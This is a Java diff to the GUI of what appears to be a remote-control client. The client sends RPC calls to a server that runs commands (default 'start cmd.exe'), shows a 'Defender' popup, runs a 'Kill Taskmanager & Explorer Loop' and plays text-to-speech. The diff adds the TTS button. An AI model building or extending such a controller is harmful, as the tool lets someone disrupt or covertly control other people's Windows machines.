@@ -61,19 +61,21 @@ public class Dashborad {
         formGrid.setHgap(10);
         formGrid.setVgap(10);
 
-        TextField field1 = addFieldRow(formGrid, 0, "Example1");
-        TextField field2 = addFieldRow(formGrid, 1, "Example2");
-        TextField field3 = addFieldRow(formGrid, 2, "Example3");
-        TextField field4 = addFieldRow(formGrid, 3, "Example4");
+        TextField field1 = addFieldRow(formGrid, 0, "Hello World");
+        TextField field2 = addFieldRow(formGrid, 1, "start cmd.exe");
+        TextField field3 = addFieldRow(formGrid, 2, "null");
+        TextField field4 = addFieldRow(formGrid, 3, "null");
+        TextField field5 = addFieldRow(formGrid, 4, "Hello");
 
         Button button1 = createActionButton("Display Text Test");
         Button button2 = createActionButton("Run Command");
         Button button3 = createActionButton("Display Defender Popup");
         Button button4 = createActionButton("Kill Taskmanager & Explorer Loop");
+        Button button5 = createActionButton("TTS");
 
         //button3.setTooltip(new Tooltip("No permissions to use this function"));
 
-        VBox buttonBox = new VBox(10, button1, button2, button3, button4);
+        VBox buttonBox = new VBox(10, button1, button2, button3, button4, button5);
         buttonBox.setPrefWidth(300);
 
         Button clearConsoleButton = new Button("Clear Console");
@@ -96,11 +98,11 @@ public class Dashborad {
                 portInt = 9000;
             }
 
-            connect(statusLabel, console, ip, portInt, connectButton, disconnectButton, button1, button2, button3, button4);
+            connect(statusLabel, console, ip, portInt, connectButton, disconnectButton, quitButton, button1, button2, button3, button4, button5);
         });
 
         disconnectButton.setOnAction(evt ->
-                disconnect(statusLabel, console, connectButton, disconnectButton, button1, button2, button3, button4)
+                disconnect(statusLabel, console, connectButton, disconnectButton, quitButton, button1, button2, button3, button4, button5)
         );
 
         quitButton.setOnAction(evt -> shutdownClient());
@@ -136,6 +138,7 @@ public class Dashborad {
 
         button3.setOnAction(evt -> callServer(statusLabel, console, "runDefenderPopup", field3.getText()));
         button4.setOnAction(evt -> callServer(statusLabel, console, "runKillTaskmngrAndExp", field4.getText()));
+        button5.setOnAction(evt -> callServer(statusLabel, console, "runTextToSpeech", field5.getText()));
 
         //runCmdIgnoreErrors
 
@@ -164,10 +167,12 @@ public class Dashborad {
                          int port,
                          Button connectButton,
                          Button disconnectButton,
+                         Button quitButton,
                          Button button1,
                          Button button2,
                          Button button3,
-                         Button button4) {
+                         Button button4,
+                         Button button5) {
 
         statusLabel.setText("Connecting to " + host + ":" + port + " ...");
         statusLabel.setStyle("-fx-text-fill: #ffb433");
@@ -191,12 +196,14 @@ public class Dashborad {
                     appendConsole(console, "Connected. Admin=" + isAdmin);
 
                     disconnectButton.setDisable(false);
-                    connectButton.setDisable(false);
+                    connectButton.setDisable(true);
+                    quitButton.setDisable(true);
 
                     button1.setDisable(false);
                     button2.setDisable(false);
                     button3.setDisable(false);
                     button4.setDisable(false);
+                    button5.setDisable(false);
                 });
             } catch (Exception e) {
                 rpc = null;
@@ -212,6 +219,7 @@ public class Dashborad {
                     button2.setDisable(true);
                     button3.setDisable(true);
                     button4.setDisable(true);
+                    button5.setDisable(true);
                 });
             }
         });
@@ -221,6 +229,7 @@ public class Dashborad {
                             TextArea console,
                             Button connectButton,
                             Button disconnectButton,
+                            Button quitButton,
                             Button... rpcButtons) {
 
         RpcClientHelper old = rpc;
@@ -236,6 +245,7 @@ public class Dashborad {
 
         disconnectButton.setDisable(true);
         connectButton.setDisable(false);
+        quitButton.setDisable(false);
 
         for (Button b : rpcButtons) b.setDisable(true);
     }
